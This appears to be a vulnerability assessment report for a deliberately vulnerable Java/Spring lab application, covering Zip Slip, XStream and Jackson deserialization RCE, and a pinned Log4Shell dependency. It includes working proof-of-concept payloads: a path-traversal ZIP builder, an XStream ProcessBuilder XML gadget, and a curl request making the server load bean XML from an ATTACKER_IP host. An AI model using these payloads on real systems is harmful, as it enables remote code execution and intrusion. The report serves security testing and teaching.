# SIMIPKIT - Vulnerability Assessment Report

**Application**: SIMIPKIT (Sistem Informasi Manajemen Investasi & Portofolio Klien Terintegrasi)  
**Assessment Type**: Source Code Review & Proof of Concept Validation  
**Technology Stack**: Java 11, Spring MVC 5.3.16, Apache Tomcat 9, MySQL / MariaDB  
**Packaging**: WAR (Maven)

---

## Table of Contents

| # | Vulnerability | CVE | CVSS v3.x | Severity | Target Endpoint |
|---|---|---|---|---|---|
| 1 | [Zip Slip - Arbitrary File Write via Path Traversal](#1-zip-slip---arbitrary-file-write-via-path-traversal) | CVE-2018-1002202 | 6.5 | Medium | `POST /documents/bulk-upload` |
| 2 | [XStream Deserialization Remote Code Execution](#2-xstream-deserialization-remote-code-execution) | CVE-2013-7285 | 8.8 | High | `POST /report-template-upload` |
| 3 | [Jackson Polymorphic Deserialization Remote Code Execution](#3-jackson-polymorphic-deserialization-remote-code-execution) | CVE-2019-12384 | 9.8 | Critical | `POST /api/sync/bank-feed` (Unauthenticated) |
| 4 | [Log4Shell Dependency Note](#4-log4shell-dependency-note) | CVE-2021-44228 | 10.0 | Critical | `POST /login` (Audit Logger) |

---

## 1. Zip Slip - Arbitrary File Write via Path Traversal

### 1.1 Summary
| Attribute | Value |
|---|---|
| **CVE ID** | CVE-2018-1002202 |
| **CWE** | CWE-22 (Path Traversal) |
| **CVSS Base Score** | 6.5 (Medium) |
| **Vulnerable Library** | `net.lingala.zip4j:zip4j` version `1.3.1` |
| **Fixed Version** | `zip4j` version `1.3.3` |

### 1.2 Root Cause
In `DocumentBulkService.java`, the `extractBulkUpload()` method calls `zip.extractAll(extractionTarget)` using `zip4j` version 1.3.1. This library version does not sanitize file entry names containing directory traversal sequences (such as `../../`).

When a ZIP entry contains `../../../../tmp/uploaded.txt`, `zip4j` extracts the file outside the intended upload directory without any boundary checks.

### 1.3 Affected Source Files
- `pom.xml`: `<zip4j.version>1.3.1</zip4j.version>`
- `src/main/java/com/happy/simipkit/service/DocumentBulkService.java`
- `src/main/java/com/happy/simipkit/controller/DocumentBulkController.java`

### 1.4 Exploitation Steps

**Step 1: Create a malicious ZIP file in Python**
```python
import zipfile

with zipfile.ZipFile("malicious_kyc.zip", "w") as zf:
    # Path traversal entry to write test file into Tomcat webroot
    zf.writestr("../../../../../opt/tomcat/webapps/ROOT/test.txt", "Path Traversal Test File")
```

**Step 2: Upload the ZIP file**
Upload `malicious_kyc.zip` via `POST /simipkit/documents/bulk-upload`.

**Step 3: Verify File Write**
Access the extracted file via HTTP:
```bash
curl "http://<target>:8080/test.txt"
```

---

## 2. XStream Deserialization Remote Code Execution

### 2.1 Summary
| Attribute | Value |
|---|---|
| **CVE ID** | CVE-2013-7285 (Primary) / CVE-2020-26217 (Related) |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **CVSS Base Score** | 8.8 (High) |
| **Vulnerable Library** | `com.thoughtworks.xstream:xstream` version `1.4.10` |
| **Fixed Version** | `xstream` version `1.4.14` (with default security framework) |

### 2.2 Root Cause
In `ReportService.java`, `XStream` is instantiated without security permissions (`xstream.addPermission(...)` or `setupDefaultSecurity()` are missing). In version 1.4.10, `xstream.fromXML(xmlContent)` processes user-supplied XML input directly.

An attacker can pass a XML payload containing a `dynamic-proxy` with `java.beans.EventHandler` targeting `java.lang.ProcessBuilder`. When XStream deserializes this XML, it executes arbitrary OS commands.

### 2.3 Affected Source Files
- `pom.xml`: `<xstream.version>1.4.10</xstream.version>`
- `src/main/java/com/happy/simipkit/service/ReportService.java`
- `src/main/java/com/happy/simipkit/controller/ReportTemplateController.java`

### 2.4 Exploitation Steps

**Step 1: Prepare XML Payload**
```xml
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>touch</string>
          <string>/tmp/xstream-pwned</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

**Step 2: Submit Payload**
Send the XML payload via `POST /simipkit/report-template-upload` (Template Upload form).

**Step 3: Verify File Creation**
```bash
ls -la /tmp/xstream-pwned
```

---

## 3. Jackson Polymorphic Deserialization Remote Code Execution

### 3.1 Summary
| Attribute | Value |
|---|---|
| **CVE ID** | CVE-2019-12384 |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **CVSS Base Score** | 9.8 (Critical) |
| **Vulnerable Library** | `com.fasterxml.jackson.core:jackson-databind` version `2.9.8` |
| **Access Requirement** | **Unauthenticated** (`/api/sync/bank-feed`) |

### 3.2 Root Cause
This vulnerability exists due to three factors:
1. `BankTransactionEvent.java` uses `@JsonTypeInfo(use = Id.CLASS)` to allow dynamic polymorphic deserialization.
2. `BankSyncService.java` creates an `ObjectMapper` without `PolymorphicTypeValidator`.
3. `GatewayExtensionDeserializer.java` reads `@type` and uses reflection (`Class.forName` and `Constructor.newInstance`) to instantiate target classes.

By passing `org.springframework.context.support.ClassPathXmlApplicationContext` as the target class, Jackson fetches a remote Spring XML bean definition over HTTP and instantiates it. 

**Why this works on Java 11**: Unlike LDAP/JNDI lookups (which are blocked in Java 11 by `trustURLCodebase=false`), this gadget uses HTTP XML loading via Spring Framework, bypassing JVM JNDI restrictions completely.

### 3.3 Affected Source Files
- `pom.xml`: `<jackson.version>2.9.8</jackson.version>`
- `src/main/java/com/happy/simipkit/model/banksync/BankTransactionEvent.java`
- `src/main/java/com/happy/simipkit/deserializer/GatewayExtensionDeserializer.java`
- `src/main/java/com/happy/simipkit/service/BankSyncService.java`
- `src/main/java/com/happy/simipkit/controller/BankSyncController.java`
- `src/main/java/com/happy/simipkit/security/AuthenticationFilter.java` (Excludes `/api/sync/*` from auth)

### 3.4 Exploitation Steps

**Step 1: Host a Spring XML bean configuration on attacker HTTP server (`http://ATTACKER_IP:8888/malicious-beans.xml`)**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>touch</value>
        <value>/tmp/jackson-pwned</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```
Start HTTP server: `python3 -m http.server 8888`

**Step 2: Send JSON payload to the unauthenticated endpoint**
```bash
curl -X POST http://<target>:8080/simipkit/api/sync/bank-feed \
  -H "Content-Type: application/json" \
  -d '{
    "@class": "com.happy.simipkit.model.banksync.SaldoUpdateEvent",
    "bankPartnerCode": "BCA",
    "referenceNumber": "REF-1001",
    "gatewayExtensionData": {
      "@type": "org.springframework.context.support.ClassPathXmlApplicationContext",
      "configLocation": "http://ATTACKER_IP:8888/malicious-beans.xml"
    }
  }'
```

**Step 3: Verify command execution**
```bash
ls -la /tmp/jackson-pwned
```

---

## 4. Log4Shell Dependency Note

### 4.1 Summary
| Attribute | Value |
|---|---|
| **CVE ID** | CVE-2021-44228 |
| **CWE** | CWE-917 (Expression Language Injection) |
| **CVSS Base Score** | 10.0 (Critical) |
| **Vulnerable Library** | `org.apache.logging.log4j:log4j-core` version `2.14.1` |

### 4.2 Description
`log4j-core` version `2.14.1` in `pom.xml` contains the Log4Shell vulnerability. In `AuditLogService.java`, user-supplied strings (such as login usernames) are logged directly via `logger.info()`.

**Java 11 Runtime Context**:  
On Java 11, the JVM default setting `com.sun.jndi.ldap.object.trustURLCodebase=false` blocks classic remote LDAP class loading. However, the dependency remains pinned to version `2.14.1` for security scanning and lab demonstration purposes.

---

## Summary Table

| # | Vulnerability | CVE | CVSS | Auth Required | Exploit Mechanism |
|---|---|---|---|---|---|
| 1 | Zip Slip | CVE-2018-1002202 | 6.5 | Yes | Path traversal entry in ZIP file (`../`) |
| 2 | XStream Deserialization RCE | CVE-2013-7285 / CVE-2020-26217 | 8.8 | Yes (Admin) | `EventHandler` + `ProcessBuilder` XML proxy |
| 3 | Jackson Polymorphic RCE | CVE-2019-12384 | 9.8 | **No** | Dynamic reflection of `ClassPathXmlApplicationContext` via HTTP |
| 4 | Log4Shell Note | CVE-2021-44228 | 10.0 | **No** | Pinned vulnerable Log4j2 dependency note |

---
*End of Report*
